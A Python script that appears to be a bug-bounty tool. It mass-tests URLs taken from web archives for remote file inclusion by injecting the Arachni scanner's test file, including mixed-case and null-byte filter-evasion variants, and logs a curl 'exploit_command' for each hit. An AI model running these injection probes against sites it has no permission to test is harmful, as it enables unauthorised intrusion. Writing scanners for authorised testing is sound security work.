import urllib.request
import json

# Function to perform RFI Check
def rfi_check(url):
    results = {"url": url, "rfi_vulnerabilities": []}
    try:
        rfi_exploit = 'hTtP://tests.arachni-scanner.com/rfi.md5.txt'
        rfi_url = url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        if "705cd559b16e6946826207c2199bd890" in http_response:
            results["rfi_vulnerabilities"].append({
                "rfi_url": rfi_url,
                "exploit_command": f"curl -s '{rfi_url}' | egrep 705cd559b16e6946826207c2199bd890 --color=auto",
                "vulnerable": True
            })
        else:
            results["rfi_vulnerabilities"].append({
                "rfi_url": rfi_url,
                "vulnerable": False
            })
    except:
        results["rfi_vulnerabilities"].append({
            "rfi_url": rfi_url,
            "vulnerable": False,
            "error": "Error during RFI check"
        })

    try:
        rfi_exploit = 'hTtP://tests.arachni-scanner.com/rfi.md5.txt%00'
        rfi_url = url.replace("INJECTX", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        if "705cd559b16e6946826207c2199bd890" in http_response:
            results["rfi_vulnerabilities"].append({
                "rfi_url": rfi_url,
                "exploit_command": f"curl -s '{rfi_url}' | egrep 705cd559b16e6946826207c2199bd890 --color=auto",
                "vulnerable": True
            })
        else:
            results["rfi_vulnerabilities"].append({
                "rfi_url": rfi_url,
                "vulnerable": False
            })
    except:
        results["rfi_vulnerabilities"].append({
            "rfi_url": rfi_url,
            "vulnerable": False,
            "error": "Error during RFI check"
        })
    
    return results

# Read URLs from waybackurl.txt
with open('waybackurl.txt', 'r') as file:
    urls = file.read().splitlines()

# Perform RFI checks and collect results
all_results = []
for url in urls:
    result = rfi_check(url)
    all_results.append(result)

# Write results to output.json
with open('output.json', 'w') as outfile:
    json.dump(all_results, outfile, indent=4)

print("RFI check completed. Results saved to output.json.")
